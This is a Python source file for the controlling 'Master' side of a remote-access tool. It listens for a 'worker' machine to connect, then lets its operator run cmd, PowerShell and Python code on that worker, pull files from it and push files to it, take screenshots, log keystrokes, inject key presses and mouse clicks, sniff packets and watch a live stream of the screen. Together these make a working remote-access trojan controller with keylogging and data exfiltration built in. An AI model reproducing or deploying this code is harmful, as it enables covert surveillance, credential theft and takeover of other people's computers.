import socket
import time
import tkinter
from typing import Callable
import struct
import sys
import threading

import cv2
import keyboard
import numpy as np

Commend = Callable[[],bytes]
RETURN = False
def cmd() -> bytes:
    global RETURN
    commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
    check_return(commend)
    if RETURN:
        return b""
    return b"cmd:"+commend.encode()

def powershell()->bytes:
    global RETURN
    commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
    check_return(commend)
    if RETURN:
        return b""
    return b"powershell:"+commend.encode()

def python()->bytes:
    global RETURN
    print("enter your python code (end with an empty line) or enter \"return\" to return to menu: ")
    code = ""
    while True:
        line = sys.stdin.readline().strip()
        if not line:
            break
        check_return(line)
        if RETURN:
            return b""
        code += line + "\n"
    return b"python:"+code.encode()

def check_return(text:str):
    global RETURN
    if text == "return":
        RETURN = True


def receive_file() ->bytes:
    global RETURN
    file_path = input("enter the path of the file you want in the worker side or enter \"return\" to return to menu: ")
    check_return(file_path)
    if RETURN:
        return b""
    return b"receive_file:"+file_path.encode()



def send_file() ->bytes:
    global RETURN
    file_path = input("enter the file path you want to send to worker or enter \"return\" to return to menu: ")
    check_return(file_path)
    if RETURN:
        return b""
    try:
        with open(file_path, "rb") as file:
            file_bytes = file.read()
        name = input("pick a name for the file in the worker(make sure you enter file type): ")
        check_return(name)
        if RETURN:
            return b""
        while name == "" or "." not in name:
            name = input("please enter a valid name")
            check_return(name)
            if RETURN:
                return b""
        return b"send_file:"+name.encode()+b":"+file_bytes
    except FileNotFoundError:
        print(f"error: file '{file_path}' does not exist.")
        return "return".encode()
    except PermissionError:
        print(f"error: file '{file_path}' is not accessible (permission issue).")
        send_file()
    except Exception as e:
        print(f"error: {e}")
        return "return".encode()

def screen_shot() ->bytes:
    return b"screen_shot"

def exit_endless_print():
    msg = input("enter \"return\" to return to menu")
    check_return(msg)
def listen_to_keys()->bytes:
    return b"listen_to_keys"

def on_key_event(event):
    print(f"Key '{event.name}' was {event.event_type}")

def live_stream() -> bytes:
    return b"live_stream"

def press_key_in_worker() -> bytes:
    global RETURN
    print("every key you press will be pressed in worker, enter ctrl+q to quit to menu")
    while True:
        event = keyboard.read_event()
        if event.event_type == "down":
            if keyboard.is_pressed("ctrl") and keyboard.is_pressed("q"):
                RETURN = True
                return b""
            else:
                return b"press_key_in_worker:" + event.name.encode()

def control_mouse() -> bytes:
    global RETURN
    print("enter mouse parameters(you can enter \"return\" at any time to return to menu):")
    x = input("horizontal coordinate: ")
    check_return(x)
    if RETURN:
        return b""
    while not x.isdigit():
        x = input("please enter a number ")
    y = input("vertical coordinate: ")
    check_return(y)
    if RETURN:
        return b""
    while not y.isdigit():
        y = input("please enter a number ")
    button = input("which button do you want to press: ")
    check_return(button)
    if RETURN:
        return b""
    while button != "left" and button!="right":
        button = input("please enter left or right ")
    return b"control_mouse:"+x.encode()+b":"+y.encode()+b":"+button.encode()


def sniff_from_worker() ->bytes:
    print("please enter parameters(you can enter \"return\" at any time to return to menu):")
    scapy_filter = input("enter your filter for the sniffing: ")
    check_return(scapy_filter)
    if RETURN:
        return  b""
    scapy_time = input("enter how much you want the sniffing to continue:")
    check_return(scapy_time)
    if RETURN:
        return  b""
    while not scapy_time.isdigit():
        scapy_time = input("please enter a valid time  in numbers")
    scapy_amount = input("enter how much packets you want to sniff: ")
    check_return(scapy_amount)
    if RETURN:
        return  b""
    while not scapy_amount.isdigit():
        scapy_amount = input("please enter a valid time  in numbers")
    return b"sniff_from_worker:" + scapy_filter.encode() + b":" + scapy_time.encode() + b":" + scapy_amount.encode()


def save_file(received:bytes):
    file_name = input("how do you want to save your file?")
    while file_name == "" or "." not in file_name:
        file_name = input("please enter a valid name")
    with open(file_name,"wb") as file:
        file.write(received)




class Master:
    def __init__(self, ip:str, port:int,functions:dict[str, Commend]):
        self.address = (ip,port)
        self.server = socket.socket()
        self.server.bind(self.address)
        self.client: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.functions = functions


    def connect(self):
        self.server.listen()
        self.client = self.server.accept()[0]
        print(self.client.recv(1024).decode())

    def recvall(self, size: int) -> bytes:
        data = b""
        while len(data) < size:
            packet = self.client.recv(size - len(data))
            if not packet:
                return b""
            data += packet
        return data

    def receiver(self) -> bytes:
        raw_size = self.recvall(4)
        if not raw_size:
            return b""
        size = struct.unpack("I", raw_size)[0]
        if size == 0:
            return b""
        message = self.recvall(size)
        return message

    def sender(self,message:bytes):
        data = struct.pack("I",len(message))+message
        self.client.send(data)

    def show_stream(self):
        global RETURN
        root = tkinter.Tk()
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        root.destroy()
        while True:
            frame_data = self.receiver()
            if not frame_data:
                break

            frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
            if frame is None:
                continue

            h, w, _ = frame.shape
            scale = min(screen_width / w, screen_height / h)
            new_w, new_h = int(w * scale), int(h * scale)
            resized = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_CUBIC)
            canvas = np.zeros((screen_height, screen_width, 3), dtype=np.uint8)
            x_offset = (screen_width - new_w) // 2
            y_offset = (screen_height - new_h) // 2
            canvas[y_offset:y_offset + new_h, x_offset:x_offset + new_w] = resized

            cv2.imshow("Live Stream", canvas)

            key = cv2.waitKey(1)

            if cv2.getWindowProperty("Live Stream", cv2.WND_PROP_VISIBLE) < 1:
                print("Window closed, stopping video loop...")
                break

            if key == ord("q"):
                print("Pressed 'q', stopping video loop...")
                break
            self.sender(b"live_stream")
        RETURN = True
        cv2.destroyAllWindows()


    def menu(self) ->str:
        print("which action do you want to do? ")
        i = 1
        for key in self.functions.keys():
            print(f"{i}: {key}")
            i+=1
        print(f"{len(self.functions.keys())+1}: quit")
        action = input("enter action name: ").replace(" ","_")
        while action not in self.functions.keys() and action != "quit":
            action = input("enter a valid name: ").replace(" ","_")
        return action


    def run(self):
        global RETURN
        self.connect()
        function:str = self.menu()
        while function !="quit":
            message = self.functions[function]()
            if function == "listen_to_keys":
                t = threading.Thread(target=exit_endless_print, daemon=True)
                t.start()
                while not RETURN:
                    self.sender(message)
                    received = self.receiver().decode()
                    if received:
                        print(received)
            if RETURN:
                RETURN = False
                function = self.menu()
                continue
            self.sender(message)
            if function == "live_stream":
                self.show_stream()
                continue

            received = self.receiver()
            if b"error" == received[:5]:
                print(received.decode())
            elif function in ["receive_file","screen_shot"]:
                save_file(received)
                if function == "screen_shot":
                    function = self.menu()
                    continue
            elif function == "sniff_from_worker":
                name = input("enter input for file name(without extension)")
                while "." in name:
                    name = input("I said without extension")
                with open(name+".pcap","wb") as file:
                    file.write(received)
                    print("saved packets successfully")
            else:
                print(received.decode())
        self.sender("quit".encode())
        self.server.close()
        self.client.close()



def main():
    functions: dict[str,Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
    master = Master("10.0.0.3",5555,functions)
    master.run()

if __name__ == '__main__':
    main()